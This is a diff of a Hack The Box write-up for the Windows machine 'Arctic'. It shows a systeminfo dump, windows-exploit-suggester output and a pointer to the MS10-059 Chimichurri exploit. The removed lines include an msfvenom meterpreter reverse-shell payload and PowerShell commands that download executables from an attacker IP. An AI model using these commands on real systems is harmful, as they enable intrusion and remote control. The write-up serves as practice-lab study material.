@@ -213,61 +213,101 @@
     02650d3.................
 
 
+### -------Privilleges Escalation------
 
------------------------------------Search exploits(Method 1)------------------------------------------------
+// Lets run systemifo
 
-$ python windows-exploit-suggester.py --database 2021-07-08-mssb.xls --systeminfo sysinfo
-[*] initiating winsploit version 3.3...
-[*] database file detected as xls or xlsx based on extension
-[*] attempting to read from the systeminfo input file
-[+] systeminfo input file read successfully (utf-8)
-[*] querying database file for potential vulnerabilities
-[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
-[*] there are now 197 remaining vulns
-[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
-[+] windows version identified as 'Windows 2008 R2 64-bit'
-[*] 
-[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
-[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
-[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
-[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
-[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
-[*] 
-[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
-[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
-[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
-[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
-[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
-[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
-[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
-[*] done
+    C:\Users\tolis\Desktop> systeminfo
+-------
 
----------------------------------------------------------------------------------------------------------------------
------------------------------------Search exploits(Method 2)---------------------------------------------------------
-
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.238 LPORT=1444 -f exe > msf_handler.exe​
-
-powershell "(new-objectSystem.Net.WebClient).Downloadfile('http://10.10.16.238/msf_handler.exe', 'msf_handler.exe')"
-
-New-ObjectSystem.Net.WebClient.Downloadfile('http://10.10.16.238/msf_handler.exe', 'msf_handler.exe')
-
-
-
------------------------------------------------------------------------------------------------------------------------------
----------------Moving file with powershell commands(didnt work for me)----------------
-// move file using shell comands
-echo $client = New-Object System.Net.WebClient >>lrm.ps1
-echo $url = "http://10.10.16.238/MS11-011.exe" >>lrm.ps1
-echo $exp = exp.exe >>lrm.ps1
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File lrm.ps1
-
+    Host Name:                 ARCTIC
+    OS Name:                   Microsoft Windows Server 2008 R2 Standard 
+    OS Version:                6.1.7600 N/A Build 7600
+    OS Manufacturer:           Microsoft Corporation
+    OS Configuration:          Standalone Server
+    OS Build Type:             Multiprocessor Free
+    Registered Owner:          Windows User
+    Registered Organization:   
+    Product ID:                55041-507-9857321-84451
+    Original Install Date:     22/3/2017, 11:09:45 ��
+    System Boot Time:          7/8/2021, 1:26:32 ��
+    System Manufacturer:       VMware, Inc.
+    System Model:              VMware Virtual Platform
+    System Type:               x64-based PC
+    Processor(s):              2 Processor(s) Installed.
+                               [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+                               [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+    BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+    Windows Directory:         C:\Windows
+    System Directory:          C:\Windows\system32
+    Boot Device:               \Device\HarddiskVolume1
+    System Locale:             el;Greek
+    Input Locale:              en-us;English (United States)
+    Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+    Total Physical Memory:     1.023 MB
+    Available Physical Memory: 214 MB
+    Virtual Memory: Max Size:  2.047 MB
+    Virtual Memory: Available: 1.149 MB
+    Virtual Memory: In Use:    898 MB
+    Page File Location(s):     C:\pagefile.sys
+    Domain:                    HTB
+    Logon Server:              N/A
+    Hotfix(s):                 N/A
+    Network Card(s):           1 NIC(s) Installed.
+                               [01]: Intel(R) PRO/1000 MT Network Connection
+                                     Connection Name: Local Area Connection
+                                     DHCP Enabled:    No
+                                     IP address(es)
+                                     [01]: 10.10.10.11
 
 
+// Copy the the output to file 'systeminfo.txt' at your host.
 
+// Second stage its to download [Windows-Exploit-Suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)(tool compares a targets patch levels against the Microsoft vulnerability database by AonCyberLabs)
 
+	$ ./windows-exploit-suggester.py --update
+// now we can run the script
+	
+	$ python windows-exploit-suggester.py -i systeminfo.txt -d 2021-07-08-mssb.xls
+------
+
+    [*] initiating winsploit version 3.3...
+    [*] database file detected as xls or xlsx based on extension
+    [*] attempting to read from the systeminfo input file
+    [+] systeminfo input file read successfully (utf-8)
+    [*] querying database file for potential vulnerabilities
+    [*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
+    [*] there are now 197 remaining vulns
+    [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+    [+] windows version identified as 'Windows 2008 R2 64-bit'
+    [*] 
+    [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
+    [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
+    [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
+    [*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
+    [*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
+    [*] 
+    [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
+    [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
+    [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
+    [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
+    [E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
+    [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
+    [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
+    [*] done
+
+// Lets focuse on ms10-059(called [Chimichurri](https://itm4n.github.io/chimichurri-reloaded/))
+
+    [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
+
+------------------------------
+----------------------------------
+-------------------------------
+
+https://github.com/abatchy17/WindowsExploits/blob/master/MS10-059%20-%20Chimichurri/MS10-059.exe
 
 
 
 
 root.txt
-ce65ceee66b2b5ebaff07e50508ffb90
+ce65ce.......................
